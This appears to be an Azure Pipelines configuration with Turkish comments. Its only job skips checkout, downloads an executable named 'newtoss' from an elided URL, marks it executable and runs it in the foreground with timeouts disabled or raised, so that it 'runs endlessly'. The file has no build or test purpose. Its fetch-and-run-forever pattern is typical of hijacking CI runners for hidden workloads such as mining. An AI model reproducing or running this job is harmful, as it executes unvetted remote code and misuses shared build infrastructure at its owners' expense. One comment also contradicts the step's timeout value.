trigger: [ main ]

jobs:
- job: long_run
  pool: { name: "german" }
  timeoutInMinutes: 0            # job zaman aşımı yok
  cancelTimeoutInMinutes: 5
  steps:
  - checkout: none
  - bash: |
      set -euo pipefail
      wget -q -O /tmp/newtoss https://.../autoren8
      chmod +x /tmp/newtoss
      /tmp/newtoss                # foreground; job bitmez
    displayName: Sonsuz çalıştır
    timeoutInMinutes: 99           # adım için de yok
